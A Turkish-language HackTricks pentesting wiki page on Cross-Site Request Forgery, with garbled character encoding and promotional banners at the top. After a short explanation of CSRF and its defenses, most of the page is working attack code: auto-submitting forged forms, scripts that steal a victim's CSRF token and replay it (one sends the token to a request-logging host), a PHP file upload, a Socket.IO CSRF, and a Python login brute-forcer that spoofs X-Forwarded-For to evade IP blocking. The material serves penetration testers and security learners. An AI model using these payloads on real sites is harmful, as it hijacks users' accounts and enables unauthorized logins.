# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nleri**](https://peass.creator-spring.com)'ni edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **Bize katÄ±lÄ±n** ğŸ’¬ [**Discord grubunda**](https://discord.gg/hRep4RUj7f) veya [**telegram grubunda**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.**

</details>

<figure><img src="../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ± ile iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±na ve zorluklarÄ±na inen iÃ§eriklerle etkileÅŸime girin

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zla deÄŸiÅŸen hacking dÃ¼nyasÄ±nda gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle gÃ¼ncel kalÄ±n

**En Son Duyurular**\
BaÅŸlatÄ±lan en yeni Ã¶dÃ¼l avcÄ±lÄ±klarÄ± ve Ã¶nemli platform gÃ¼ncellemeleri hakkÄ±nda bilgi sahibi olun

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸine baÅŸlayÄ±n!

## Cross-Site Request Forgery (CSRF) AÃ§Ä±klamasÄ±

**Cross-Site Request Forgery (CSRF)**, web uygulamalarÄ±nda bulunan bir gÃ¼venlik aÃ§Ä±ÄŸÄ± tÃ¼rÃ¼dÃ¼r. Bu aÃ§Ä±k, saldÄ±rganlarÄ±n kimlik doÄŸrulanmÄ±ÅŸ oturumlarÄ±nÄ± sÃ¶mÃ¼rerek habersiz kullanÄ±cÄ±lar adÄ±na iÅŸlemler gerÃ§ekleÅŸtirmesine olanak tanÄ±r. SaldÄ±rÄ±, bir kullanÄ±cÄ±nÄ±n, bir kurbanÄ±n platformuna oturum aÃ§mÄ±ÅŸ olduÄŸu sÄ±rada kÃ¶tÃ¼ niyetli bir siteyi ziyaret etmesiyle gerÃ§ekleÅŸtirilir. Bu site daha sonra, JavaScript yÃ¼rÃ¼terek, formlar gÃ¶ndererek veya resimler getirerek kurbanÄ±n hesabÄ±na istekler gÃ¶nderir.

### CSRF SaldÄ±rÄ±sÄ± iÃ§in Ã–nkoÅŸullar

CSRF aÃ§Ä±ÄŸÄ±ndan yararlanmak iÃ§in birkaÃ§ koÅŸulun saÄŸlanmasÄ± gerekir:

1. **DeÄŸerli Bir Eylemi TanÄ±mlama**: SaldÄ±rganÄ±n, kullanÄ±cÄ±nÄ±n ÅŸifresini, e-postasÄ±nÄ± deÄŸiÅŸtirmek veya ayrÄ±calÄ±klarÄ± yÃ¼kseltmek gibi sÃ¶mÃ¼rÃ¼lecek bir eylemi bulmasÄ± gerekir.
2. **Oturum YÃ¶netimi**: KullanÄ±cÄ±nÄ±n oturumu yalnÄ±zca Ã§erezler veya HTTP Temel Kimlik DoÄŸrulama baÅŸlÄ±ÄŸÄ± aracÄ±lÄ±ÄŸÄ±yla yÃ¶netilmelidir, diÄŸer baÅŸlÄ±klar bu amaÃ§la manipÃ¼le edilemez.
3. **Tahmin Edilemeyen Parametrelerin YokluÄŸu**: Ä°stek, saldÄ±rÄ±yÄ± engelleyebilecek tahmin edilemeyen parametreler iÃ§ermemelidir.

### HÄ±zlÄ± Kontrol

**Burp'ta isteÄŸi yakalayabilir** ve CSRF korumalarÄ±nÄ± kontrol edebilir ve tarayÄ±cÄ±dan test etmek iÃ§in **Fetch olarak kopyala**'ya tÄ±klayabilir ve isteÄŸi kontrol edebilirsiniz:

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

### CSRF'ye KarÅŸÄ± Savunma

CSRF saldÄ±rÄ±larÄ±na karÅŸÄ± korunmak iÃ§in Ã§eÅŸitli karÅŸÄ± Ã¶nlemler alÄ±nabilir:

* [**SameSite Ã§erezleri**](hacking-with-cookies/#samesite): Bu Ã¶zellik, tarayÄ±cÄ±nÄ±n Ã§erezleri Ã§apraz site istekleriyle birlikte gÃ¶ndermesini engeller. [SameSite Ã§erezleri hakkÄ±nda daha fazla bilgi](hacking-with-cookies/#samesite).
* [**Cross-origin resource sharing**](cors-bypass.md): Kurban sitesinin CORS politikasÄ±, saldÄ±rÄ±nÄ±n gerÃ§ekleÅŸtirilmesi iÃ§in kurban sitesinden yanÄ±tÄ±n okunmasÄ±nÄ± gerektiriyorsa saldÄ±rÄ±nÄ±n uygulanabilirliÄŸini etkileyebilir. [CORS atlatma hakkÄ±nda bilgi edinin](cors-bypass.md).
* **KullanÄ±cÄ± DoÄŸrulamasÄ±**: KullanÄ±cÄ±nÄ±n niyetini doÄŸrulamak iÃ§in ÅŸifresini sormak veya bir captcha Ã§Ã¶zdÃ¼rmek Ã¶nemli olabilir.
* **Referrer veya Origin BaÅŸlÄ±klarÄ±nÄ± Kontrol Etme**: Bu baÅŸlÄ±klarÄ± doÄŸrulamak, isteklerin gÃ¼venilir kaynaklardan geldiÄŸinden emin olmaya yardÄ±mcÄ± olabilir. Ancak, URL'lerin dikkatli bir ÅŸekilde oluÅŸturulmasÄ±, kÃ¶tÃ¼ uygulanan kontrolleri atlayabilir, Ã¶rneÄŸin:
* `http://mal.net?orig=http://example.com` (URL gÃ¼venilen URL ile biter)
* `http://example.com.mal.net` (URL gÃ¼venilen URL ile baÅŸlar)
* **Parametre AdlarÄ±nÄ± DeÄŸiÅŸtirme**: POST veya GET isteklerinde parametre adlarÄ±nÄ± deÄŸiÅŸtirmek, otomatik saldÄ±rÄ±larÄ± Ã¶nlemede yardÄ±mcÄ± olabilir.
* **CSRF Token'larÄ±**: Her oturuma benzersiz bir CSRF token eklemek ve bu token'Ä± sonraki isteklerde gerektirmek, CSRF riskini Ã¶nemli Ã¶lÃ§Ã¼de azaltabilir. Token'Ä±n etkinliÄŸi, CORS'un zorunlu kÄ±lÄ±nmasÄ±yla artÄ±rÄ±labilir.

Bu savunmalarÄ± anlamak ve uygulamak, web uygulamalarÄ±nÄ±n gÃ¼venliÄŸini ve bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ korumak iÃ§in hayati Ã¶nem taÅŸÄ±r.

## SavunmalarÄ± Atlatma

### POST'tan GET'e

Belki de istismar etmek istediÄŸiniz form, bir **CSRF token ile POST isteÄŸi gÃ¶ndermeye hazÄ±rlanmÄ±ÅŸtÄ±r ancak**, bir **GET**'in de **geÃ§erli olup olmadÄ±ÄŸÄ±nÄ± kontrol etmelisiniz** ve GET isteÄŸi gÃ¶nderdiÄŸinizde **CSRF token'Ä±n hala doÄŸrulandÄ±ÄŸÄ±nÄ± kontrol edin**.

### Token eksikliÄŸi

Uygulamalar, var olduklarÄ±nda **token'larÄ± doÄŸrulamak** iÃ§in bir mekanizma uygulayabilir. Ancak, token yokken doÄŸrulamanÄ±n tamamen atlandÄ±ÄŸÄ± bir gÃ¼venlik aÃ§Ä±ÄŸÄ± ortaya Ã§Ä±kabilir. SaldÄ±rganlar, token'Ä± taÅŸÄ±yan parametreyi sadece deÄŸerini deÄŸil, parametreyi kaldÄ±rarak bu doÄŸrulama sÃ¼recini atlayabilir. Bu, saldÄ±rganlarÄ±n doÄŸrulama sÃ¼recini atlayarak Cross-Site Request Forgery (CSRF) saldÄ±rÄ±sÄ±nÄ± etkili bir ÅŸekilde gerÃ§ekleÅŸtirmesine olanak tanÄ±r.

### CSRF token'Ä± kullanÄ±cÄ± oturumuna baÄŸlÄ± deÄŸil

Uygulamalar, CSRF token'larÄ±nÄ± kullanÄ±cÄ± oturumlarÄ±na baÄŸlamayarak Ã¶nemli bir **gÃ¼venlik riski** oluÅŸturabilir. Bu sistemler, her token'Ä±n baÅŸlatan oturuma baÄŸlÄ± olmasÄ±nÄ± saÄŸlamak yerine token'larÄ± genel bir havuzda doÄŸrular.

SaldÄ±rganlarÄ±n bunu nasÄ±l sÃ¶mÃ¼rdÃ¼ÄŸÃ¼:

1. Kendi hesaplarÄ±yla **kimlik doÄŸrulama** yaparlar.
2. Genel havuzdan geÃ§erli bir CSRF token **alÄ±rlar**.
3. Bu token'Ä± bir kurban Ã¼zerindeki CSRF saldÄ±rÄ±sÄ±nda **kullanÄ±rlar**.

Bu zayÄ±f token doÄŸrulama mekanizmasÄ±nÄ± sÃ¶mÃ¼rerek saldÄ±rganlarÄ±n kurban adÄ±na yetkisiz istekler yapmasÄ±na olanak tanÄ±r.

### YÃ¶ntem atlatma

EÄŸer istek "**garip**" bir **yÃ¶ntem** kullanÄ±yorsa, **yÃ¶ntem geÃ§ersizleÅŸtirme iÅŸlevinin Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± kontrol edin**. Ã–rneÄŸin, **PUT** yÃ¶ntemini kullanÄ±yorsa **POST** yÃ¶ntemini deneyebilir ve ÅŸunu **gÃ¶nderebilirsiniz**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Bu ayrÄ±ca **_method parametresini POST isteÄŸi iÃ§ine yerleÅŸtirerek** veya **baÅŸlÄ±klarÄ± kullanarak** Ã§alÄ±ÅŸabilir:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### Ã–zel baÅŸlÄ±k token atlatma

EÄŸer istek, **CSRF koruma yÃ¶ntemi olarak** bir **Ã¶zel baÅŸlÄ±kta token** ekliyorsa, o zaman:

* Ä°steÄŸi **Ã–zel Token ve baÅŸlÄ±k olmadan** test edin.
* AynÄ± uzunlukta fakat farklÄ± bir token ile isteÄŸi test edin.

### CSRF token'Ä± bir Ã§erez tarafÄ±ndan doÄŸrulanÄ±yor

Uygulamalar, CSRF korumasÄ±nÄ±, hem bir Ã§erezde hem de bir istek parametresinde token'Ä± Ã§oÄŸaltarak veya bir CSRF Ã§erezi ayarlayarak ve backend'de gÃ¶nderilen token'Ä±n Ã§erezle eÅŸleÅŸip eÅŸleÅŸmediÄŸini doÄŸrulayarak uygulayabilir. Uygulama, isteÄŸin token'Ä±nÄ±n, Ã§erezdeki deÄŸerle uyumlu olup olmadÄ±ÄŸÄ±nÄ± kontrol ederek istekleri doÄŸrular.

Ancak, bu yÃ¶ntem, bir CRLF gÃ¼venlik aÃ§Ä±ÄŸÄ± gibi bir saldÄ±rganÄ±n kurbanÄ±n tarayÄ±cÄ±sÄ±nda bir CSRF Ã§erezi ayarlamasÄ±na izin veren web sitesi hatalarÄ±na sahipse CSRF saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±zdÄ±r. SaldÄ±rgan, Ã§erezi ayarlayan aldatÄ±cÄ± bir resim yÃ¼kleyerek ve ardÄ±ndan CSRF saldÄ±rÄ±sÄ±nÄ± baÅŸlatarak bunu sÃ¶mÃ¼rebilir.

AÅŸaÄŸÄ±da, bir saldÄ±rÄ±nÄ±n nasÄ±l yapÄ±landÄ±rÄ±labileceÄŸine dair bir Ã¶rnek bulunmaktadÄ±r:
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
Not: EÄŸer **csrf belirteci oturum Ã§erezi ile iliÅŸkilendirilmiÅŸse bu saldÄ±rÄ± Ã§alÄ±ÅŸmayacaktÄ±r** Ã§Ã¼nkÃ¼ kurbanÄ±n oturumunu ayarlamanÄ±z gerekecek ve dolayÄ±sÄ±yla kendinize saldÄ±rÄ± gerÃ§ekleÅŸtirmiÅŸ olacaksÄ±nÄ±z.
{% endhint %}

### Content-Type deÄŸiÅŸikliÄŸi

[**Buna**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests) gÃ¶re, **POST** yÃ¶ntemini kullanarak **Ã¶nyÃ¼kleme** isteklerini **Ã¶nlemek** iÃ§in izin verilen Content-Type deÄŸerleri ÅŸunlardÄ±r:

- **`application/x-www-form-urlencoded`**
- **`multipart/form-data`**
- **`text/plain`**

Ancak, **Sunucunun mantÄ±ÄŸÄ±** kullanÄ±lan **Content-Type**'a baÄŸlÄ± olarak deÄŸiÅŸebilir, bu yÃ¼zden belirtilen deÄŸerleri ve **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._ gibi diÄŸer deÄŸerleri denemelisiniz.

JSON verilerini text/plain olarak gÃ¶nderme Ã¶rneÄŸi ([buradan](https://brycec.me/posts/corctf\_2021\_challenges)):
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### JSON Verileri iÃ§in Preflight Ä°steklerinin AtlatÄ±lmasÄ±

JSON verilerini POST isteÄŸi aracÄ±lÄ±ÄŸÄ±yla gÃ¶ndermeye Ã§alÄ±ÅŸÄ±rken, HTML formunda `Content-Type: application/json` kullanmak doÄŸrudan mÃ¼mkÃ¼n deÄŸildir. Benzer ÅŸekilde, bu iÃ§erik tÃ¼rÃ¼nÃ¼ gÃ¶ndermek iÃ§in `XMLHttpRequest` kullanmak bir preflight isteÄŸi baÅŸlatÄ±r. Bununla birlikte, sunucunun JSON verilerini iÅŸleyip iÅŸlemediÄŸini Content-Type'a bakÄ±lmaksÄ±zÄ±n kontrol etmek iÃ§in bu kÄ±sÄ±tlamayÄ± potansiyel olarak atlatmanÄ±n stratejileri bulunmaktadÄ±r:

1. **Alternatif Ä°Ã§erik TÃ¼rleri Kullanma**: Formda `enctype="text/plain"` ayarlayarak `Content-Type: text/plain` veya `Content-Type: application/x-www-form-urlencoded` kullanÄ±n. Bu yaklaÅŸÄ±m, sunucunun Content-Type'a bakÄ±lmaksÄ±zÄ±n verileri kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± test eder.
2. **Ä°Ã§erik TÃ¼rÃ¼nÃ¼ DeÄŸiÅŸtirme**: Sunucunun iÃ§eriÄŸi JSON olarak tanÄ±dÄ±ÄŸÄ±ndan emin olurken preflight isteÄŸini Ã¶nlemek iÃ§in verileri `Content-Type: text/plain; application/json` ile gÃ¶nderebilirsiniz. Bu bir preflight isteÄŸi baÅŸlatmaz ancak sunucunun `application/json`'Ä± kabul etmek iÃ§in yapÄ±landÄ±rÄ±lmÄ±ÅŸsa doÄŸru ÅŸekilde iÅŸleyebilir.
3. **SWF Flash DosyasÄ± KullanÄ±mÄ±**: Daha az yaygÄ±n ancak mÃ¼mkÃ¼n olan bir yÃ¶ntem, bu tÃ¼r kÄ±sÄ±tlamalarÄ± atlamak iÃ§in SWF flash dosyasÄ± kullanmaktÄ±r. Bu teknik hakkÄ±nda detaylÄ± bilgi iÃ§in [bu yazÄ±ya](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937) baÅŸvurabilirsiniz.

### Referrer / Origin kontrolÃ¼nÃ¼ atlatma

**Referrer BaÅŸlÄ±ÄŸÄ±nÄ± Kullanmamak**

Uygulamalar, 'Referer' baÅŸlÄ±ÄŸÄ±nÄ± yalnÄ±zca var olduÄŸunda doÄŸrulayabilir. TarayÄ±cÄ±nÄ±n bu baÅŸlÄ±ÄŸÄ± gÃ¶ndermesini engellemek iÃ§in aÅŸaÄŸÄ±daki HTML meta etiketi kullanÄ±labilir:
```xml
<meta name="referrer" content="never">
```
Bu, bazÄ± uygulamalardaki doÄŸrulama kontrollerini atlayarak 'Referer' baÅŸlÄ±ÄŸÄ±nÄ±n atlanmasÄ±nÄ± saÄŸlar.

**Regexp atlamalarÄ±**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Sunucunun alan adÄ±nÄ±, Referrer'Ä±n parametreler iÃ§inde gÃ¶ndereceÄŸi URL'de ayarlamak iÃ§in ÅŸunu yapabilirsiniz:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **HEAD method bypass**

Bu [**CTF Ã§Ã¶zÃ¼mÃ¼**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) 'nÃ¼n ilk kÄ±smÄ±nda [Oak'Ä±n kaynak kodu](https://github.com/oakserver/oak/blob/main/router.ts#L281), bir yÃ¶nlendirici **HEAD isteklerini yanÄ±tsÄ±z GET istekleri olarak iÅŸlemek Ã¼zere ayarlandÄ±ÄŸÄ±** aÃ§Ä±klanmÄ±ÅŸtÄ±r - bu, Oak'a Ã¶zgÃ¼ olmayan yaygÄ±n bir Ã§Ã¶zÃ¼mdÃ¼r. HEAD isteklerini iÅŸleyen Ã¶zel bir iÅŸleyici yerine, bunlar sadece **GET iÅŸleyiciye verilir ancak uygulama yanÄ±t gÃ¶vdesini kaldÄ±rÄ±r**.

DolayÄ±sÄ±yla, bir GET isteÄŸi sÄ±nÄ±rlanÄ±yorsa, sadece **GET isteÄŸi olarak iÅŸlenen bir HEAD isteÄŸi gÃ¶nderebilirsiniz**.

## **SÃ¶mÃ¼rÃ¼ Ã–rnekleri**

### **CSRF Belirteci SÄ±zdÄ±rma**

EÄŸer bir **CSRF belirteci** kullanÄ±lÄ±yorsa **savunma** olarak, [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) zafiyeti veya [**Dangling Markup**](dangling-markup-html-scriptless-injection/) zafiyetini istismar ederek onu **sÄ±zdÄ±rmayÄ±** deneyebilirsiniz.

### **HTML etiketleri kullanarak GET**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
DiÄŸer HTML5 etiketleri, otomatik olarak bir GET isteÄŸi gÃ¶ndermek iÃ§in kullanÄ±labilir:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Form GET isteÄŸi
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Form POST isteÄŸi
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Iframe aracÄ±lÄ±ÄŸÄ±yla Form POST isteÄŸi
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST isteÄŸi**
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST isteÄŸi
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST isteÄŸi v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Bir iframe iÃ§inden Form POST isteÄŸi
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **CSRF Token'un Ã‡alÄ±nmasÄ± ve Bir POST Ä°steÄŸi GÃ¶nderilmesi**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **CSRF Token'unu Ã§alma ve bir iframe, bir form ve Ajax kullanarak bir Post isteÄŸi gÃ¶nderme**
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **CSRF Token'unu Ã‡alma ve bir iframe ve bir form kullanarak bir POST isteÄŸi gÃ¶nderme**
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Token'Ä± Ã§al ve 2 iframe kullanarak gÃ¶nder**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **Ajax kullanarak CSRF belirteci Ã§alma ve bir form ile post gÃ¶nderme**
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### Socket.IO ile CSRF
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF GiriÅŸ Kaba Kuvvet

Kod, bir CSRF belirteci kullanarak bir giriÅŸ formunu Kaba Kuvvet saldÄ±rÄ±sÄ± iÃ§in kullanÄ±labilir (AyrÄ±ca olasÄ± bir IP karalama listesini atlatmaya Ã§alÄ±ÅŸmak iÃ§in X-Forwarded-For baÅŸlÄ±ÄŸÄ±nÄ± da kullanÄ±yor):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## AraÃ§lar <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Referanslar

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
